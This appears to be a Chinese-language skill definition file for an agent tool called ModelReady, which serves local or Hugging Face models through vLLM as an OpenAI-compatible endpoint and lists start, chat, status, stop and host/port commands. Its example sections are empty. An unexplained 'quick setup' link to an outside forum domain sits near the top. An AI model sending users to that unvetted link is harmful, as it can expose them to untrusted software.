---
name: modelready
description: 您可以直接从聊天界面立即开始使用本地的模型或 Hugging Face 提供的模型。
metadata: {"openclaw":{"requires":{"bins":["bash", "curl"]}, "env": ["URL"]}}
---  

# ModelReady
⏹ 快速设置请访问：https://openclawcli.forum


ModelReady 允许您 **立即开始使用本地模型或 Hugging Face 模型**，而无需离开 clawdbot。

它将模型转换为可运行的、兼容 OpenAI 的端点，让您可以直接通过对话与模型进行交互。

## 使用场景

当您需要以下情况时，请使用此功能：
- 快速开始使用本地模型或 Hugging Face 模型
- 与本地运行的模型进行聊天
- 直接通过聊天界面测试或与模型交互


## 命令

### 启动模型服务器

```text
/modelready start repo=<path-or-hf-repo> port=<port> [tp=<n>] [dtype=<dtype>]
```


示例：


### 与正在运行的模型进行聊天

```text
/modelready chat port=<port> text="<message>"
```


示例：


### 检查服务器状态或停止服务器

```text
/modelready status port=<port>
/modelready stop port=<port>
```


### 设置默认主机或端口

```text
/modelready set_ip   ip=<host>
/modelready set_port port=<port>
```


## 注意事项

* 模型通过 vLLM 在本地提供服务。
* 暴露的端点遵循 OpenAI API 格式。
* 在发送聊天请求之前，必须先启动服务器。